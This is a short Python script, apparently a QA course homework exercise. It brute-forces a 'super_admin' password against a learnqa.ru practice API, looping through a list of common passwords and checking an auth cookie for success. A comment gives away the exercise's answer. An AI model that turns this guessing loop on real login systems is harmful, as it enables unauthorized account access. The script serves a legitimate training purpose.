import requests

# Top 25 most common passwords by year according to SplashData
passwords_list = ['michael', 'photoshop', 'aa123456', 'passw0rd', '1qaz2wsx', '111111', '123456789', 'football',
                  'trustno1', 'princess', 'adobe123', 'master', 'letmein', 'bailey', '7777777', 'batman', 'hottie',
                  'Football', 'shadow', 'freedom', 'login', 'charlie', '1234', '000000', '123123', 'qwertyuiop',
                  'welcome', 'iloveyou', '654321', '', 'loveme', 'abc123', '123456', 'dragon', 'monkey', '1q2w3e4r',
                  'azerty', 'starwars', '!@#$%^&*', '696969', 'hello', 'lovely', '666666', '121212', 'superman',
                  'solo', 'ninja', 'qwerty123', 'ashley', '123qwe', '555555', 'sunshine', '888888', 'whatever',
                  '12345678', 'admin', '12345', 'password1', 'qwerty', '1234567890', '1234567', 'mustang', 'baseball',
                  'qazwsx', 'password', 'jesus', 'donald', 'flower', 'zaq1zaq1', 'access']


get_secret_password_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_cookie_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
login = 'super_admin'


# Перебираем пароли, правильный пароль - "welcome"
for password in passwords_list:
    response = requests.post(get_secret_password_url, data={"login": login, "password": password})
    cookie_value = response.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookie_value}

    response_authorization = requests.post(check_cookie_url, cookies=cookies)
    if response_authorization.text == "You are authorized":
        print(response_authorization.text)
        print(password)
        break
